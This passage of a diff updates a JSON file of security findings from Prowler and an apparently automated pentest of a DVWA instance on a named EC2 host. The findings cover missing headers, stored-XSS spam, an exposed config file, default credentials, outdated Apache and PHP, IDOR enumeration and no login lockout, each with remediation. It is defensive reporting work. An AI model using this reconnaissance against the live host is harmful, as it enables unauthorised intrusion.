+      "remediation_summary": "1. Add .gitignore to the web server's deny list or move it outside the web root. 2. Ensure the config directory has restricted access (403). 3. Remove the config/config.inc.php reference from public .gitignore or use a server-side .gitignore not accessible via HTTP.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "f00a27d0-254a-4874-be1a-3216d221846e",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2549,7 +2853,7 @@
       "is_validated": true
     },
     {
-      "id": "da6a7478-a78e-4671-b26e-592aff86b625",
+      "id": "20113385-5820-475f-a738-1f19eed0b659",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2583,7 +2887,7 @@
       "is_validated": true
     },
     {
-      "id": "77875575-f8b8-4655-82ca-d10c9883ad92",
+      "id": "c5475b95-b5af-424f-9eb0-cd90f13c0980",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2617,7 +2921,7 @@
       "is_validated": true
     },
     {
-      "id": "9f8f72cc-8cc0-492c-acc3-6cda28c7fea1",
+      "id": "7ac788cb-b4eb-46fe-954a-9d1a17d01655",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2651,7 +2955,7 @@
       "is_validated": true
     },
     {
-      "id": "a5ff9931-1b44-4368-b630-950c81dd68a6",
+      "id": "29850e8b-1e5f-4f77-97bf-655e4e9903d5",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2685,7 +2989,7 @@
       "is_validated": true
     },
     {
-      "id": "3c91701a-d084-4cfe-aa40-348387efd7eb",
+      "id": "fdf83707-6a06-4d1e-9a47-6a1f3fc3b568",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2719,7 +3023,7 @@
       "is_validated": true
     },
     {
-      "id": "eb7da996-83e4-46d8-82f8-e9cf44ba72d6",
+      "id": "5b7c373e-12aa-402e-b85d-550e4a0afb6c",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2753,7 +3057,7 @@
       "is_validated": true
     },
     {
-      "id": "81c62c31-8631-444a-986f-fce87f769d2f",
+      "id": "ae7ebf6a-318b-4a7d-8080-f872bb3dcc86",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2787,7 +3091,7 @@
       "is_validated": true
     },
     {
-      "id": "44100258-2e42-4c87-8e4e-35154a7be520",
+      "id": "f4d22b8e-ea94-45bf-a82b-f12a66aeb993",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2821,7 +3125,7 @@
       "is_validated": true
     },
     {
-      "id": "46ee9282-a0f5-4a80-ae72-dce0f925dcc4",
+      "id": "548074ba-ab6b-4b4d-b40e-397d8edeeaf9",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2855,7 +3159,7 @@
       "is_validated": true
     },
     {
-      "id": "79afed10-8184-40d3-93b1-bbf0be41adce",
+      "id": "c7074898-0121-4a33-9413-667b905595d2",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2889,7 +3193,7 @@
       "is_validated": true
     },
     {
-      "id": "e231f9ca-60df-41ef-98da-b0cd80a1713b",
+      "id": "52cb5f11-7943-49a6-b124-e8f0395a9f5a",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2923,7 +3227,7 @@
       "is_validated": true
     },
     {
-      "id": "943e1d4b-a88f-4ca8-a306-93776c9e70ec",
+      "id": "5edb96d9-acaf-4838-a8f7-63e9ba38f979",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2957,7 +3261,7 @@
       "is_validated": true
     },
     {
-      "id": "17751609-3a33-4337-bb8e-69d0ad5aa876",
+      "id": "f24e8686-b303-4c3b-9479-c2b98695b73b",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -2991,7 +3295,7 @@
       "is_validated": true
     },
     {
-      "id": "45e09d04-fc53-44f1-b9ac-3f3439596a7e",
+      "id": "09cbdb21-7163-45b4-888e-091e5f092c5e",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -3025,7 +3329,7 @@
       "is_validated": true
     },
     {
-      "id": "64ffe639-85c9-4261-8dd7-c2aef2126d24",
+      "id": "40c99243-307b-4aba-ada0-4ab7e0dc4549",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -3059,7 +3363,7 @@
       "is_validated": true
     },
     {
-      "id": "96102e4e-f468-463f-b6a2-1d48ed75ab32",
+      "id": "c003d83f-6a7b-4919-8730-b32396d4943d",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -3093,7 +3397,7 @@
       "is_validated": true
     },
     {
-      "id": "dce5d7fe-5d72-4bd9-8ee6-ad1891833675",
+      "id": "3c93768e-f17c-45df-8d49-62ee09c0ee05",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -3124,7 +3428,7 @@
       "is_validated": true
     },
     {
-      "id": "8aab154d-efe1-4fdb-8e97-790c5491cd75",
+      "id": "2fd44552-6dea-4169-9dc2-332dbef956ca",
       "source": "prowler",
       "phase": 2,
       "severity": "LOW",
@@ -3158,23 +3462,39 @@
       "is_validated": true
     },
     {
-      "id": "ec1fdd35-54cd-4e70-9642-a861fe329d9d",
+      "id": "04949ca9-8e65-4b53-8ba1-d45167c2fbf5",
       "source": "autopentest",
       "phase": 3,
       "severity": "LOW",
-      "category": "WSTG-CONF-14",
-      "title": "Multiple Security Headers Missing (X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)",
-      "description": "The application does not set any of the recommended HTTP security response headers on its pages. The following headers are entirely absent across all tested pages (/login.php, /index.php, /):\n\n- X-Frame-Options: Missing \u2014 allows the application to be embedded in iframes, enabling clickjacking attacks (no frame-ancestors CSP either).\n- X-Content-Type-Options: nosniff \u2014 Missing \u2014 allows MIME-type sniffing which can lead to content injection (e.g., serving a JS file as image/gif and having the browser execute it).\n- X-XSS-Protection: Missing \u2014 legacy IE/Chrome header, absence is low risk on modern browsers but indicates no security header hygiene.\n- Referrer-Policy: Missing \u2014 full URL referrer leaked to third parties on navigation, which can expose session context in URLs.\n- Permissions-Policy (Feature-Policy): Missing \u2014 no restrictions on browser feature access (camera, microphone, geolocation).\n- Strict-Transport-Security: N/A \u2014 site runs on HTTP only (no HTTPS), so HSTS cannot be set (already logged as FINDING-003).\n- Content-Security-Policy: Absent (logged separately as FINDING-013).\n\nThe most impactful missing headers in this context are X-Frame-Options (clickjacking) and X-Content-Type-Options (MIME sniffing).",
+      "category": "WSTG-BUSL-05",
+      "title": "No Rate Limiting on Guestbook / Stored XSS Endpoint",
+      "description": "The stored XSS guestbook endpoint at /vulnerabilities/xss_s/ has no rate limiting or submission throttling. Three consecutive POST requests were submitted without any blocking, CAPTCHA, or error response. This allows attackers to flood the guestbook with unlimited spam entries, stored XSS payloads, or use the endpoint for data exfiltration purposes without any restriction. Combined with the stored XSS vulnerability (FINDING-032), an attacker can automate mass injection of malicious scripts into the guestbook that will execute for every user who views the page.",
       "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
-      "remediation_summary": "Add the following headers to Apache configuration (httpd.conf or .htaccess):\nHeader always set X-Frame-Options \"SAMEORIGIN\"\nHeader always set X-Content-Type-Options \"nosniff\"\nHeader always set X-XSS-Protection \"1; mode=block\"\nHeader always set Referrer-Policy \"strict-origin-when-cross-origin\"\nHeader always set Permissions-Policy \"geolocation=(), microphone=(), camera=()\"\nAdditionally, enable mod_headers in Apache and ensure the Header directive is in a context that applies to all responses. Long-term, migrate to HTTPS and add Strict-Transport-Security with includeSubDomains and preload.",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_s/",
+      "remediation_summary": "1. Implement rate limiting on form submissions (e.g., max 5 submissions per IP per minute). 2. Add CAPTCHA to prevent automated submissions. 3. Implement a minimum time between submissions per session. 4. This is secondary to fixing the stored XSS vulnerability itself.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "e8157957-0654-421b-804b-1ba1c93dfc1a",
+      "id": "fa72ed2d-46b3-4caf-8236-2d539f88587c",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "LOW",
+      "category": "WSTG-CLNT-14",
+      "title": "Reverse Tabnabbing - External Links Use target=\"_blank\" Without rel=\"noopener\"",
+      "description": "Multiple pages in the application contain links with target=\"_blank\" that do not include rel=\"noopener noreferrer\". This allows the opened tab to access the opener's window object via window.opener, enabling reverse tabnabbing attacks. An attacker who can influence the content of a linked page could redirect the original tab to a phishing page after the user navigates to the external link. This was found on the about.php and upload vulnerability pages which link to OWASP resources and security tool sites.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/index.php",
+      "remediation_summary": "Add rel=\"noopener noreferrer\" to all anchor tags that use target=\"_blank\". Example: &lt;a href=\"https://external.com\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;. Modern browsers (Chrome 88+) implicitly set noopener for target=\"_blank\" links, but explicit attribute is best practice for cross-browser support.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "98856aac-b5ea-4e31-be4f-d97850519b99",
       "source": "autopentest",
       "phase": 1,
       "severity": "MEDIUM",
@@ -3190,7 +3510,7 @@
       "is_validated": false
     },
     {
-      "id": "bb57413a-a7ea-45a0-9337-52bf2f909157",
+      "id": "2ee7d8a4-9b44-4eba-bf0c-6fca91e510d7",
       "source": "autopentest",
       "phase": 1,
       "severity": "MEDIUM",
@@ -3206,7 +3526,151 @@
       "is_validated": false
     },
     {
-      "id": "42961837-8734-449f-b17f-fdb8bf445b06",
+      "id": "03b9145e-9c52-4fd6-9014-940025a0ab46",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-CONF-09",
+      "title": "Sensitive Configuration File Publicly Accessible (/config/config.inc.php)",
+      "description": "The application configuration file /config/config.inc.php is publicly readable over HTTP without authentication. The file contains commented-out AWS credential templates (AKIA key ID and secret access key placeholders). While the current values are placeholders (\"YOUR_KEY_ID_HERE\"), the file structure confirms this path is intended for storing real AWS credentials, and the file is not protected by Apache access controls or authentication. If real credentials were inserted (or were previously present and cached), they would be fully exposed. The file is served with Content-Type text/html and returns HTTP 200 regardless of authentication status.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php",
+      "remediation_summary": "1. Immediately restrict access to /config/ directory via Apache .htaccess or main config: Deny from all / Require all denied. 2. Remove any real credentials from this file if they were ever present. 3. Move configuration files outside the webroot entirely (above the DocumentRoot). 4. Use environment variables or a secrets manager (AWS Secrets Manager, Parameter Store) for AWS credentials instead of flat files. 5. Audit git history to verify real credentials were never committed.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "fbf84359-bec1-4d69-807a-142f9b255bf9",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-CONF-02",
+      "title": "DVWA Setup Page Exposes Default Credentials and Internal Paths",
+      "description": "The DVWA setup page at /setup.php is accessible without restriction (HTTP 200) and discloses: (1) Default administrator credentials (\"admin\" // \"password\"), (2) The full filesystem path to the config file (/var/www/html/config/config.inc.php), (3) Whether the config directory is writable by the web server (Yes - www-data), (4) The database password (masked as ******). Additionally, Apache's server-status page (/server-status) returns HTTP 403 with the server version in the error page footer (\"Apache/2.4.25 (Debian) Server at... Port 80\"). The server version Apache/2.4.25 is significantly outdated (released 2017) and has known vulnerabilities. No /server-info page was found (404).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php",
+      "remediation_summary": "1. Restrict access to /setup.php via IP allowlist or authentication, or remove it from production. 2. Upgrade Apache from 2.4.25 to current stable version (2.4.62+) \u2014 version 2.4.25 has multiple known CVEs. 3. Configure Apache ServerTokens to 'Prod' to suppress version disclosure. 4. Ensure the config directory is not world-writable by the web server.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "d51f5158-a168-4dce-b591-4537fd99d444",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-CONF-01",
+      "title": "Outdated Apache Web Server Version Disclosed (Apache/2.4.25 Debian)",
+      "description": "The server discloses its exact version in the Server response header on every HTTP response: \"Apache/2.4.25 (Debian)\". Apache 2.4.25 was released in December 2016 and has numerous known CVEs. Open ports per nmap: TCP/22 (SSH - OpenSSH 8.7), TCP/80 (HTTP - Apache 2.4.25). Ports 443, 3306, 8080, 8443, 21 are filtered. The SSH service (OpenSSH 8.7) is also accessible, representing an additional attack surface if weak credentials are in use. No reverse proxy or CDN headers detected (no Via, CF-RAY, X-Cache, etc.).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "1. Upgrade Apache to the current stable release (2.4.62+). 2. Set ServerTokens to 'Prod' in Apache config to suppress version info from headers. 3. Set ServerSignature to 'Off' to suppress version from error pages. 4. Apply all Debian security patches for the installed Apache version. 5. Consider restricting SSH access (port 22) to known IP ranges.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "60122637-3956-4219-9051-d1a8e10baa5b",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-CONF-12",
+      "title": "Content Security Policy Missing or Critically Weak Across Application",
+      "description": "No Content-Security-Policy header is present on any standard application page (/login.php, /index.php, /). The only CSP present is on /vulnerabilities/csp/ (an intentional DVWA challenge page), and that CSP is itself critically weak: it allows scripts from external domains including pastebin.com and the bare domain example.com (without HTTPS). The absence of CSP across the application means there is no browser-enforced mitigation against XSS attacks. Any reflected or stored XSS payload (which DVWA is intentionally vulnerable to) will execute without browser-level defense. This is especially significant given that FINDING-004 confirmed the session cookie lacks HttpOnly, making XSS-to-session-theft a complete attack chain.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "1. Implement a Content-Security-Policy header on all application pages, starting with a restrictive default: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'. 2. Remove external domains from script-src unless strictly necessary. 3. Never allow pastebin.com or other user-content-hosting domains in script-src. 4. Use CSP nonces or hashes instead of 'unsafe-inline' for any inline scripts required. 5. Test CSP coverage using a CSP evaluator tool before deployment.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "e0cbdc1b-fbbf-41b6-a642-54e31e2a80c7",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-ATHZ-04",
+      "title": "Insecure Direct Object Reference \u2014 User Data Accessible by Arbitrary ID",
+      "description": "The SQL Injection vulnerability module at /vulnerabilities/sqli/ exposes all application user records via an IDOR vulnerability. Any authenticated user can retrieve the first name and surname of any other user account by manipulating the \"id\" GET parameter. No authorization check verifies that the requesting user owns the requested record. All 5 user accounts (IDs 1-5) were enumerated successfully, including the admin account (ID=1). While this specific endpoint is the SQL Injection demonstration module in DVWA, the IDOR pattern demonstrates the absence of object-level authorization throughout the application.\n\nUsers exposed: admin/admin (ID 1), Gordon Brown (ID 2), Hack Me (ID 3), Pablo Picasso (ID 4), Bob Smith (ID 5).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/",
+      "remediation_summary": "Implement object-level authorization checks: verify that the authenticated user has permission to access the requested record before returning data. For user-specific data, confirm that the session user ID matches the requested object ID (or the user has an admin role). Use parameterized queries and enforce row-level access controls at the database or application layer.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "5f8cfdb4-b56f-4a5b-abf0-8bda4ed65643",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-ATHN-03",
+      "title": "No Account Lockout Mechanism on Login Form",
+      "description": "The DVWA login form does not implement any account lockout, rate limiting, or brute-force protection. Ten consecutive failed login attempts for the admin account all returned the same generic \"Login failed\" response with HTTP 302 redirect to login.php. No CAPTCHA was presented, no lockout occurred, and no delay was introduced between attempts. This enables unlimited brute-force attacks against any account.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
+      "remediation_summary": "Implement account lockout after 5 failed attempts (temporary lockout of 15-30 minutes). Add progressive delays between attempts. Consider implementing CAPTCHA after 3 failed attempts. Log and alert on repeated failed login attempts from same IP. Implement IP-based rate limiting.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "1e2ec980-8f2d-4182-b1d1-1fcead8e9d23",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-CONF-02",
+      "title": "Apache Directory Listing Enabled on Multiple Sensitive Directories",
+      "description": "Apache directory listing (Options +Indexes) is enabled on multiple directories: /config/ (contains configuration files including credential backup), /hackable/uploads/ (file upload destination \u2014 allows enumeration of uploaded files), and /docs/ (documentation). Directory listing allows attackers to enumerate all files in these directories without requiring knowledge of file names.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/",
+      "remediation_summary": "Disable Apache directory listing globally by adding 'Options -Indexes' to the server or VirtualHost configuration. Apply to /config/, /hackable/uploads/, /docs/ and all other web-accessible directories.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "f132a305-14fb-4e9d-bbed-2f966436efe0",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-INFO-02",
+      "title": "phpinfo.php Publicly Accessible - Full Server Configuration Exposure",
+      "description": "The phpinfo.php page is accessible to authenticated users and discloses extensive server configuration details including: PHP version (7.0.30-0+deb9u1, EOL since Dec 2018), system information (Linux, Amazon Linux 2023 kernel), document root (/var/www/html/), server name, disabled functions list, and other PHP configuration settings. PHP 7.0.x reached end-of-life in December 2018 and receives no security patches.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/phpinfo.php",
+      "remediation_summary": "1. Remove or restrict access to phpinfo.php from production. 2. Upgrade PHP from EOL 7.0.x to a supported version (8.1+). 3. If phpinfo.php must exist, restrict access via .htaccess IP allowlist.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "85748d25-6b2c-4795-89d9-1bf2f4e60662",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "MEDIUM",
+      "category": "WSTG-INFO-02",
+      "title": "Outdated Web Server and PHP Version Disclosed (Apache 2.4.25, PHP 7.0.30)",
+      "description": "The Server response header discloses the exact web server version: Apache/2.4.25 (Debian). Apache 2.4.25 was released in December 2016 and has numerous known CVEs including CVE-2017-7679 (mod_mime buffer overread), CVE-2017-7668 (ap_find_token buffer overread), and CVE-2017-9788 (mod_auth_digest memory issues). The 404 error page also displays the server version and hostname. PHP 7.0.30 (exposed via phpinfo.php) reached end-of-life in December 2018 and receives no security updates.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "1. Update Apache to a supported version (2.4.62+). 2. Upgrade PHP to a supported version (8.1+). 3. Suppress exact version in Server header via ServerTokens Prod in Apache config. 4. Customize error pages to remove server version disclosure.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "f98fc537-82e4-4bdf-a93b-63b36e1f0bb5",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3253,7 +3717,7 @@
       "is_validated": true
     },
     {
-      "id": "b6c2e061-6b71-45e9-a939-bf264d780843",
+      "id": "7cd3ef66-a793-43f3-80c2-70d89f1e0f75",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3300,7 +3764,7 @@
       "is_validated": true
     },
     {
-      "id": "e49d1e55-d170-4eea-8d46-7b63265675b0",
+      "id": "ae48f7b6-70bd-46fa-b553-94aef3266f98",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3346,7 +3810,7 @@
       "is_validated": true
     },
     {
-      "id": "7e69e46f-fc0c-4845-8762-9d0774cfd019",
+      "id": "d8b2e5c1-9ef3-41eb-9ebf-88b3ed11e500",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3393,7 +3857,7 @@
       "is_validated": true
     },
     {
-      "id": "0aebbb46-0744-4c9b-afc0-e69b79424532",
+      "id": "e9fcd7e5-5300-430d-b63d-ce16571f7868",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3434,7 +3898,7 @@
       "is_validated": true
     },
     {
-      "id": "7758e50a-8395-4ee3-bf18-1db0a7b790b0",
+      "id": "d8af977f-46e0-41ed-8795-8c8777cde5f7",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3478,7 +3942,7 @@
       "is_validated": true
     },
     {
-      "id": "06d38ac7-bbb3-4e09-ad15-62519e0a09fd",
+      "id": "4beb9a00-8298-47fd-aa41-0032acaee1e5",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3521,7 +3985,7 @@
       "is_validated": true
     },
     {
-      "id": "d3052385-3edf-4ab8-b25f-cb78969eb572",
+      "id": "7eebb767-0d2f-4014-90e1-b8db682b4146",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3558,7 +4022,7 @@
       "is_validated": true
     },
     {
-      "id": "e2f8ed9e-5754-45be-aaa4-15d01c648d7d",
+      "id": "225bead9-68bd-4ec5-82c6-6b14ec31b586",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3598,7 +4062,7 @@
       "is_validated": true
     },
     {
-      "id": "192f6e2f-78db-4ad1-9f4d-960613930e06",
+      "id": "6b979c64-c1ea-4634-ba61-c4fa4afed10e",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3639,7 +4103,7 @@
       "is_validated": true
     },
     {
-      "id": "b4f0616d-3ab9-45cb-8b49-4265f4a7b67f",
+      "id": "57870c40-bcdb-477e-81fb-09af9249a309",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3682,7 +4146,7 @@
       "is_validated": true
     },
     {
-      "id": "dd7cc7b2-2103-4b9d-9fd5-34bf628456f7",
+      "id": "aa10a148-1de8-4cae-ab47-12a0429d25bc",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3726,7 +4190,7 @@
       "is_validated": true
     },
     {
-      "id": "d72de0ef-5e64-41e3-933c-83190b3e9cfb",
+      "id": "ce87e6e1-d572-43d3-bac8-bdcf25c01c59",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3767,7 +4231,7 @@
       "is_validated": true
     },
     {
-      "id": "ed7a4588-cfcf-4403-88e1-63b588b6f9e7",
+      "id": "cc42ca36-ab58-4dfc-b9b7-786747165645",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3806,7 +4270,7 @@
       "is_validated": true
     },
     {
-      "id": "e8420f6d-5628-40d8-b6bb-00e1f19d0412",
+      "id": "d255d3bb-cab2-4af9-8e6c-04b4b0fd4ca8",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3847,7 +4311,7 @@
       "is_validated": true
     },
     {
-      "id": "f3cb215a-0c4e-4704-8a49-624f2c380391",
+      "id": "3e261ad3-f5e5-4b49-b163-cafd31e3b01a",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3893,7 +4357,7 @@
       "is_validated": true
     },
     {
-      "id": "8f96ac5f-a109-4048-a5ef-0794a04aa36d",
+      "id": "147a5927-721b-4055-97ec-b51b30883670",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3939,7 +4403,7 @@
       "is_validated": true
     },
     {
-      "id": "fe0fdeb0-9c90-4c61-b89b-ae88d3f9cc49",
+      "id": "e45c0c8d-a21d-4b34-a6fe-af016ec3ce7a",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -3985,7 +4449,7 @@
       "is_validated": true
     },
     {
-      "id": "951777f4-038f-453b-96d0-e98289f15566",
+      "id": "49a75415-69b9-4dba-9790-a0dcd2a29d5b",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4031,7 +4495,7 @@
       "is_validated": true
     },
     {
-      "id": "06636702-beb8-4d14-9cb4-62ed3df30a36",
+      "id": "515be802-ffea-4174-b8d8-54649371cb2b",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4077,7 +4541,7 @@
       "is_validated": true
     },
     {
-      "id": "c93c25b0-b6a6-4bba-8f85-ffed397bfbd6",
+      "id": "b6e33a20-3a80-4858-9cd1-9f4de03aa512",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4123,7 +4587,7 @@
       "is_validated": true
     },
     {
-      "id": "b23b94ab-4e31-4a25-ab2a-cf888be7f9ba",
+      "id": "61886126-7cb7-419e-a838-9f73b2015a5a",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4169,7 +4633,7 @@
       "is_validated": true
     },
     {
-      "id": "59d25e95-1b82-48eb-9975-f1967848e868",
+      "id": "3dc95424-2f4b-495f-aef2-0ece9c3b3f79",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4215,7 +4679,7 @@
       "is_validated": true
     },
     {
-      "id": "2c541cbb-3c00-4778-9bed-04451db08954",
+      "id": "ee82be73-1fec-4dc4-b2e8-6cf6da005564",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4261,7 +4725,7 @@
       "is_validated": true
     },
     {
-      "id": "c53a8790-55cc-4398-b4af-4532065e5871",
+      "id": "b9ca7515-aece-4db3-94cd-a75db5929d6e",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4307,7 +4771,7 @@
       "is_validated": true
     },
     {
-      "id": "7e291a2a-bf84-4784-b340-5d862c11c72b",
+      "id": "566e860c-31da-44ce-9afe-355bb9bfb4a4",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4353,7 +4817,7 @@
       "is_validated": true
     },
     {
-      "id": "f22c0f48-4bed-4409-89b4-42352145e944",
+      "id": "a1512e16-df36-49a8-9d92-95769fb7bf7b",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4399,7 +4863,7 @@
       "is_validated": true
     },
     {
-      "id": "c1a147d8-d1d2-47fc-bb54-5ee9d42282bd",
+      "id": "6e9b0102-3700-4bfe-92e8-560985aba4bb",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4445,7 +4909,7 @@
       "is_validated": true
     },
     {
-      "id": "b402082e-3933-4235-874e-28625fcf63aa",
+      "id": "59ff9c25-bf26-4797-8464-b74de5f08186",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4491,7 +4955,7 @@
       "is_validated": true
     },
     {
-      "id": "88221397-c30e-4add-b02e-d56557402145",
+      "id": "9251c96e-214d-4294-b4d9-a99128141e78",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4537,7 +5001,7 @@
       "is_validated": true
     },
     {
-      "id": "48465594-568a-4cf7-8204-e19511d89019",
+      "id": "6607c626-7b76-4ffc-8657-c19fa7fdb2b7",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4583,7 +5047,7 @@
       "is_validated": true
     },
     {
-      "id": "e62e73af-8b6f-4df4-8aea-c7e8517f322c",
+      "id": "420b7370-54b1-462e-b050-570b8cbeb46a",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4629,7 +5093,7 @@
       "is_validated": true
     },
     {
-      "id": "f86dc6a4-c9e3-4390-9745-5ebaeb1cf667",
+      "id": "0204dfdd-aed7-43e4-aeb0-c3410a9c656b",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4666,7 +5130,7 @@
       "is_validated": true
     },
     {
-      "id": "b59699ae-b317-49b2-a46e-0342f7154245",
+      "id": "161373ba-628e-410c-977c-5afaf47e2148",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4703,7 +5167,7 @@
       "is_validated": true
     },
     {
-      "id": "aaa75479-3ef1-4ac1-a4f2-373b4b2ab582",
+      "id": "21e030c6-37ed-4800-8402-cbe502219a80",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4740,7 +5204,7 @@
       "is_validated": true
     },
     {
-      "id": "244288d0-11c8-414c-b1b0-6911bfa68143",
+      "id": "27d543d1-1fa8-4cb4-a5d6-d5667a253327",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4777,7 +5241,7 @@
       "is_validated": true
     },
     {
-      "id": "ae5d2438-afd0-4432-9dd5-49d502cae8ec",
